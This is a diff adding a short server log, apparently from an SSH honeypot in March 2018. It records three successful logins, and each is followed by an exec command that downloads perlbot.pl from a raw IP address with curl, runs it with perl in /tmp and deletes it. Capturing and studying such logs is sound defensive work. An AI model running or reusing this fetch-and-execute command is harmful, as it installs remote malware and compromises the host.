@@ -1,0 +1,12 @@
+180303-02:58:05 login login successful 
+180303-02:58:05 channel_request session 
+180303-02:58:05 exec_request success 
+180303-02:58:05 exec command cd /tmp && curl -O http://188.209.52.183/perlbot.pl && perl perlbot.pl && rm -rf perlbot.pl 
+180303-03:06:38 login login successful 
+180303-03:06:38 channel_request session 
+180303-03:06:38 exec_request success 
+180303-03:06:38 exec command cd /tmp && curl -O http://188.209.52.183/perlbot.pl && perl perlbot.pl && rm -rf perlbot.pl 
+180303-03:23:09 login login successful 
+180303-03:23:09 channel_request session 
+180303-03:23:09 exec_request success 
+180303-03:23:09 exec command cd /tmp && curl -O http://188.209.52.183/perlbot.pl && perl perlbot.pl && rm -rf perlbot.pl 
